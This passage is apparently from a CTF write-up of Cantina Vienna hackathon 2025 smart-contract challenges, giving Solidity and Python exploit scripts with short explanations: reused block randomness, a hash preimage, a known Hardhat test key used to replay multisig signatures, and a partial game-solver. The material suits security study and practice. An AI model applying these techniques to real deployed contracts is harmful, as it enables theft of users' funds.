      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"deadline: </span><span class="si">{</span><span class="n">deadline</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"sig: </span><span class="si">{</span><span class="n">sig</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>
      <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">helper</span><span class="p">.</span><span class="n">functions</span><span class="p">.</span><span class="n">helpCall</span><span class="p">(</span>
                  <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">challenge</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">300000</span><span class="p">,</span> <span class="n">deadline</span><span class="p">,</span> <span class="n">encode_with_signature</span><span class="p">(</span><span class="s">"solve()"</span><span class="p">),</span> <span class="n">sig</span><span class="p">),</span> <span class="mi">3</span>
              <span class="p">).</span><span class="n">send_transaction</span><span class="p">()</span>
              <span class="k">break</span>
          <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
              <span class="k">pass</span>
        
      <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">cast_call</span><span class="p">(</span><span class="n">challenge</span><span class="p">,</span> <span class="s">"winnings(address)(uint256)"</span><span class="p">,</span> <span class="n">account</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
</pre></table></code></div></div><li><p>writeup</p><p>Contracts in the same block use the same <code class="language-plaintext highlighter-rouge">block.prevrandao</code>. Based on the use of the forwarder in Easy 1, use a helper function to determine whether to call the challenge contract based on the random result.</p></ul><h2 id="fangs-venom">Fang’s venom<a href="#fangs-venom" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/FANG'S_VENOM">challenge link</a></p><hr /><p>Transaction hash: 0x84758cfe94c3f8227d132fbcc616293043946049f1ef9088768c33358080bdc3</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>  <span class="c1">// SPDX-License-Identifier: UNLICENSED
</span>  <span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
    
  <span class="k">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="n">from</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
  <span class="c1">// import {Vyper} from "./Vyper.sol";
</span>  <span class="k">import</span> <span class="p">{</span><span class="n">ChallengeMedium2</span><span class="p">}</span> <span class="n">from</span> <span class="s">"../vienna_hackathon_2025/FANG'S_VENOM/Challenge_Medium_2.sol"</span><span class="p">;</span>
    
  <span class="k">contract</span> <span class="n">Medium2</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
      <span class="kt">address</span> <span class="k">private</span> <span class="n">deployer</span> <span class="o">=</span> <span class="mh">0x7b7DC09643302549d633b45c901B9051E2354388</span><span class="p">;</span>
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
    
          <span class="n">ChallengeMedium2</span> <span class="n">chall</span> <span class="o">=</span> <span class="n">ChallengeMedium2</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="mh">0x8919B92F52bb8C1aF7C9AFeE2Bdd179d3272919e</span><span class="p">));</span>
    
          <span class="kt">bytes32</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0x55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd4</span><span class="p">;</span>
          <span class="kt">uint256</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xd1b</span><span class="p">;</span>
    
          <span class="n">chall</span><span class="p">.</span><span class="n">imadeadbeef</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">);</span>
    
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup</p><p>the <code class="language-plaintext highlighter-rouge">imadeadbeef</code> function requires two parameters, it concats two params and hash, then compares with value at storage 4 (0x98de0bff1fd1afdd3978d3dc3a57fc8af4b4d05ca4d23f4ec3593c0276ce0eb9)</p><p>tried some values and found <code class="language-plaintext highlighter-rouge">codehash</code> and <code class="language-plaintext highlighter-rouge">codesize</code> were the correct answer</p></ul><h2 id="metal-knuckles-permissions">Metal Knuckle’s Permissions<a href="#metal-knuckles-permissions" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/METAL_KNUCKLE'S_PERMISSION">challenge link</a></p><hr /><p>Transaction hash: 0xf6e08f017f68efd3ab95c98628f6d404a61cfad69ba51eb7d81739eb710f1ccb</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>  <span class="k">contract</span> <span class="n">MetalKnuckle</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
          <span class="kt">address</span> <span class="n">deploy</span> <span class="o">=</span> <span class="mh">0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434</span><span class="p">;</span>
          <span class="kt">address</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x702105690fCbfC7588254bA71f0EEA60663c2534</span><span class="p">;</span>
          <span class="kt">address</span> <span class="n">signer</span> <span class="o">=</span> <span class="mh">0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><span class="p">;</span>
          <span class="kt">uint256</span> <span class="n">signer_private_key</span> <span class="o">=</span> <span class="mh">0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80</span><span class="p">;</span>
          <span class="kt">bytes32</span> <span class="n">message</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">signer</span><span class="p">))),</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">addr</span><span class="p">)))));</span>
          <span class="p">(</span><span class="kt">uint8</span> <span class="n">v</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">r</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">s</span><span class="p">)</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">signer_private_key</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
          <span class="n">IPermitToReenter</span><span class="p">.</span><span class="n">Sig</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">sig</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IPermitToReenter</span><span class="p">.</span><span class="n">Sig</span><span class="p">[](</span><span class="mi">3</span><span class="p">);</span>
          <span class="n">sig</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">IPermitToReenter</span><span class="p">.</span><span class="n">Sig</span><span class="p">({</span><span class="n">_index</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">hashed</span><span class="o">:</span> <span class="n">message</span><span class="p">,</span> <span class="n">v</span><span class="o">:</span> <span class="n">v</span><span class="p">,</span> <span class="n">r</span><span class="o">:</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="o">:</span> <span class="n">s</span><span class="p">});</span>
          <span class="n">sig</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">IPermitToReenter</span><span class="p">.</span><span class="n">Sig</span><span class="p">({</span><span class="n">_index</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">hashed</span><span class="o">:</span> <span class="n">message</span><span class="p">,</span> <span class="n">v</span><span class="o">:</span> <span class="n">v</span><span class="p">,</span> <span class="n">r</span><span class="o">:</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="o">:</span> <span class="n">s</span><span class="p">});</span>
          <span class="n">sig</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">IPermitToReenter</span><span class="p">.</span><span class="n">Sig</span><span class="p">({</span><span class="n">_index</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">hashed</span><span class="o">:</span> <span class="n">message</span><span class="p">,</span> <span class="n">v</span><span class="o">:</span> <span class="n">v</span><span class="p">,</span> <span class="n">r</span><span class="o">:</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="o">:</span> <span class="n">s</span><span class="p">});</span>
          <span class="n">IPermitToReenter</span><span class="p">(</span><span class="n">deploy</span><span class="p">).</span><span class="n">multisig</span><span class="p">(</span><span class="n">sig</span><span class="p">);</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup searched <code class="language-plaintext highlighter-rouge">0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</code> address in google, and found a private key <a href="https://ethereum.stackexchange.com/questions/94886/hardhat-local-network-keys-generation"><code class="language-plaintext highlighter-rouge">https://ethereum.stackexchange.com/questions/94886/hardhat-local-network-keys-generation</code></a> so we could sign arbitrary message and sent same signed messages in <code class="language-plaintext highlighter-rouge">multisig</code> function to solve.</p></ul><h2 id="vectors-3-bit-surfer-island">Vector’s 3-Bit Surfer Island<a href="#vectors-3-bit-surfer-island" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/VECTOR'S_3BIT_SURFER_ISLAND">challenge link</a></p><hr /><p>Transaction hash: 0x68bb55ae163d192fe9d65e8dfafc91b3c6d9ac3d9b668661419dcf389a41031b</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>  <span class="k">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">}</span> <span class="n">from</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
  <span class="k">import</span> <span class="p">{</span><span class="n">console</span><span class="p">}</span> <span class="n">from</span> <span class="s">"forge-std/console.sol"</span><span class="p">;</span>
  <span class="k">contract</span> <span class="n">Hard2Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
    
          <span class="kt">address</span> <span class="n">chall</span> <span class="o">=</span> <span class="mh">0x4328B9410575a383349F2e88644C933F91c6A5C6</span><span class="p">;</span>
    
          <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span>
              <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex"00000000"</span><span class="p">),</span>
              <span class="kt">uint256</span><span class="p">(</span><span class="mi">27684352554021427800379120908796796058859940284427164423451880434819558757544</span><span class="p">),</span>
              <span class="kt">uint256</span><span class="p">(</span><span class="mi">43736918673050163201934668174654671028240</span><span class="p">)</span>
          <span class="p">);</span>
    
          <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">chall</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
          <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Call failed"</span><span class="p">);</span>
    
          <span class="n">console</span><span class="p">.</span><span class="n">logBytes</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
</pre><td class="rouge-code"><pre>  <span class="kn">from</span> <span class="nn">eth_hash.auto</span> <span class="kn">import</span> <span class="n">keccak</span>
  <span class="kn">from</span> <span class="nn">eth_utils</span> <span class="kn">import</span> <span class="n">to_bytes</span><span class="p">,</span> <span class="n">int_to_big_endian</span>
    
  <span class="c1"># Constants from Core.huff
</span>  <span class="n">ACTION_NONE</span> <span class="o">=</span> <span class="mh">0x0</span>    <span class="c1"># keep current lane, no vertical move
</span>  <span class="n">ACTION_UP</span> <span class="o">=</span> <span class="mh">0x1</span>      <span class="c1"># move to lane above (index-1)
</span>  <span class="n">ACTION_DOWN</span> <span class="o">=</span> <span class="mh">0x2</span>    <span class="c1"># move to lane below (index+1)
</span>  <span class="n">ACTION_JUMP</span> <span class="o">=</span> <span class="mh">0x3</span>    <span class="c1"># jump over a ROCK
</span>  <span class="n">ACTION_DODGE</span> <span class="o">=</span> <span class="mh">0x4</span>   <span class="c1"># slide under a WIRE
</span>    
  <span class="n">LANE_EMPTY</span> <span class="o">=</span> <span class="mh">0x0</span>
  <span class="n">LANE_WALL</span> <span class="o">=</span> <span class="mh">0x1</span>
  <span class="n">LANE_ROCK</span> <span class="o">=</span> <span class="mh">0x2</span>
  <span class="n">LANE_WIRE</span> <span class="o">=</span> <span class="mh">0x3</span>
    
  <span class="c1"># Constants from Main.huff
</span>  <span class="n">POT_ADDRESS</span> <span class="o">=</span> <span class="mh">0x1234567890abcdef1234567890abcdef12345678</span>
  <span class="n">ADDPOINTS_SELECTOR</span> <span class="o">=</span> <span class="mh">0xad7b985e</span>
  <span class="c1"># SEED = 0x51716105bf233e10fe12591e77e79e0718d782d0de6dcc5bf0a6b49c625b6690
</span>  <span class="k">def</span> <span class="nf">_get_front_obstacle</span><span class="p">(</span><span class="n">current_lane</span><span class="p">,</span> <span class="n">lanes</span><span class="p">):</span>
      <span class="s">"""Get obstacle in the current lane from lanes bitmap"""</span>
      <span class="k">if</span> <span class="n">current_lane</span> <span class="o">==</span> <span class="mh">0x1</span><span class="p">:</span>
          <span class="k">return</span> <span class="p">(</span><span class="n">lanes</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
      <span class="k">elif</span> <span class="n">current_lane</span> <span class="o">==</span> <span class="mh">0x2</span><span class="p">:</span>
          <span class="k">return</span> <span class="p">((</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
      <span class="k">elif</span> <span class="n">current_lane</span> <span class="o">==</span> <span class="mh">0x3</span><span class="p">:</span>
          <span class="k">return</span> <span class="p">((</span><span class="n">lanes</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span>
    
  <span class="k">def</span> <span class="nf">decode_obstacle</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed</span><span class="p">):</span>
      <span class="s">"""Extract obstacle code at a given position from seed"""</span>
      <span class="n">mask</span> <span class="o">=</span> <span class="mh">0x7</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="n">pos</span><span class="p">)</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">seed</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="n">pos</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">encode_obstacle</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
      <span class="s">"""Encode obstacle code into lanes bitmap"""</span>
      <span class="n">lanemask</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x862311</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">code</span><span class="o">*</span><span class="mi">3</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
      <span class="n">value</span> <span class="o">=</span> <span class="n">code</span><span class="o">//</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">1</span>
      <span class="n">lane1</span> <span class="o">=</span> <span class="p">(</span><span class="n">lanemask</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">value</span>
      <span class="n">lane2</span> <span class="o">=</span> <span class="p">((</span><span class="n">lanemask</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">value</span>
      <span class="n">lane3</span> <span class="o">=</span> <span class="p">((</span><span class="n">lanemask</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">value</span>
      <span class="k">return</span> <span class="n">lane1</span> <span class="o">|</span> <span class="p">(</span><span class="n">lane2</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">lane3</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">build_lane</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed</span><span class="p">):</span>
      <span class="s">"""Build lane from position and seed"""</span>
      <span class="n">obstacle</span> <span class="o">=</span> <span class="n">decode_obstacle</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">encode_obstacle</span><span class="p">(</span><span class="n">obstacle</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">join_lane</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">lanes_b</span><span class="p">,</span> <span class="n">lanes_a</span><span class="p">):</span>
      <span class="s">"""Join two lane bitmaps based on offset"""</span>
      <span class="n">mask</span> <span class="o">=</span> <span class="mh">0x7</span> <span class="o">&lt;&lt;</span> <span class="n">offset</span>
      <span class="n">a_masked</span> <span class="o">=</span> <span class="n">lanes_a</span> <span class="o">&amp;</span> <span class="n">mask</span>
      <span class="n">b_masked</span> <span class="o">=</span> <span class="n">lanes_b</span> <span class="o">&amp;</span> <span class="n">mask</span>
      <span class="n">a_shifted</span> <span class="o">=</span> <span class="n">a_masked</span> <span class="o">&gt;&gt;</span> <span class="n">offset</span>
      <span class="n">b_shifted</span> <span class="o">=</span> <span class="n">b_masked</span> <span class="o">&gt;&gt;</span> <span class="n">offset</span>
      <span class="k">return</span> <span class="n">select</span><span class="p">(</span><span class="n">b_shifted</span><span class="p">,</span> <span class="n">a_shifted</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">select</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
      <span class="s">"""Select between two values based on if a is zero"""</span>
      <span class="n">mask</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">0</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span> <span class="n">mask</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">mask</span><span class="p">))</span>
    
  <span class="k">def</span> <span class="nf">build_tracks</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">):</span>
      <span class="s">"""Build combined tracks from seeds"""</span>
      <span class="n">lanes_b</span> <span class="o">=</span> <span class="n">build_lane</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_b</span><span class="p">)</span>
      <span class="n">lanes_a</span> <span class="o">=</span> <span class="n">build_lane</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">seed_a</span><span class="p">)</span>
        
      <span class="n">lane1</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span><span class="n">lanes_b</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">,</span> <span class="n">lanes_a</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
      <span class="n">lane3</span> <span class="o">=</span> <span class="n">join_lane</span><span class="p">(</span><span class="mh">0x6</span><span class="p">,</span> <span class="n">lanes_b</span><span class="p">,</span> <span class="n">lanes_a</span><span class="p">)</span>
      <span class="n">lane2</span> <span class="o">=</span> <span class="n">join_lane</span><span class="p">(</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">lanes_b</span><span class="p">,</span> <span class="n">lanes_a</span><span class="p">)</span>
        
      <span class="k">return</span> <span class="n">lane1</span> <span class="o">|</span> <span class="p">(</span><span class="n">lane2</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">lane3</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">get_action</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">actions</span><span class="p">):</span>
      <span class="s">"""Get action for the current position"""</span>
      <span class="n">mask</span> <span class="o">=</span> <span class="mh">0x7</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">pos</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
      <span class="k">return</span> <span class="p">((</span><span class="n">actions</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">pos</span> <span class="o">*</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x7</span>
    
  <span class="k">def</span> <span class="nf">get_seeds</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
      <span class="s">"""Generate two seeds from input seed"""</span>
      <span class="n">seed</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
      <span class="n">sender_as_int</span> <span class="o">=</span> <span class="mh">0x702105690fCbfC7588254bA71f0EEA60663c2534</span>
      <span class="n">packed_data</span> <span class="o">=</span> <span class="n">int_to_big_endian</span><span class="p">(</span><span class="n">sender_as_int</span><span class="p">).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">seed</span><span class="p">)</span>
      <span class="n">seed_a</span> <span class="o">=</span> <span class="s">'0x'</span> <span class="o">+</span> <span class="n">keccak</span><span class="p">(</span><span class="n">packed_data</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
      <span class="n">seed_b</span> <span class="o">=</span> <span class="s">'0x'</span> <span class="o">+</span> <span class="n">keccak</span><span class="p">(</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">seed_a</span><span class="p">)).</span><span class="nb">hex</span><span class="p">()</span>
      <span class="k">print</span><span class="p">(</span><span class="n">seed_a</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="n">seed_b</span><span class="p">)</span>
      <span class="n">seed_a</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">seed_a</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
      <span class="n">seed_b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">seed_b</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">seed_b</span><span class="p">,</span> <span class="n">seed_a</span>
    
  <span class="k">def</span> <span class="nf">update_current_lane</span><span class="p">(</span><span class="n">user_action</span><span class="p">,</span> <span class="n">current_lane</span><span class="p">):</span>
      <span class="s">"""Update player's current lane based on action"""</span>
      <span class="n">lane_change</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="k">if</span> <span class="n">user_action</span> <span class="o">==</span> <span class="n">ACTION_UP</span><span class="p">:</span>
          <span class="n">lane_change</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
      <span class="k">elif</span> <span class="n">user_action</span> <span class="o">==</span> <span class="n">ACTION_DOWN</span><span class="p">:</span>
          <span class="n">lane_change</span> <span class="o">=</span> <span class="mi">1</span>
        
      <span class="n">new_lane</span> <span class="o">=</span> <span class="n">current_lane</span> <span class="o">+</span> <span class="n">lane_change</span>
        
      <span class="c1"># Validate lane bounds (1-3)
</span>      <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">new_lane</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">):</span>
          <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Invalid lane position"</span><span class="p">)</span>
        
      <span class="k">return</span> <span class="n">new_lane</span>
    
  <span class="k">def</span> <span class="nf">validate_move</span><span class="p">(</span><span class="n">user_action</span><span class="p">,</span> <span class="n">obstacle</span><span class="p">):</span>
      <span class="s">"""Validate if move is valid against obstacle"""</span>
      <span class="c1"># Can't move into a wall
</span>      <span class="k">if</span> <span class="n">obstacle</span> <span class="o">==</span> <span class="n">LANE_WALL</span><span class="p">:</span>
          <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Cannot move into a wall"</span><span class="p">)</span>
        
      <span class="c1"># Must jump over rocks
</span>      <span class="k">if</span> <span class="n">obstacle</span> <span class="o">==</span> <span class="n">LANE_ROCK</span> <span class="ow">and</span> <span class="n">user_action</span> <span class="o">!=</span> <span class="n">ACTION_JUMP</span><span class="p">:</span>
          <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Must jump over rocks"</span><span class="p">)</span>
        
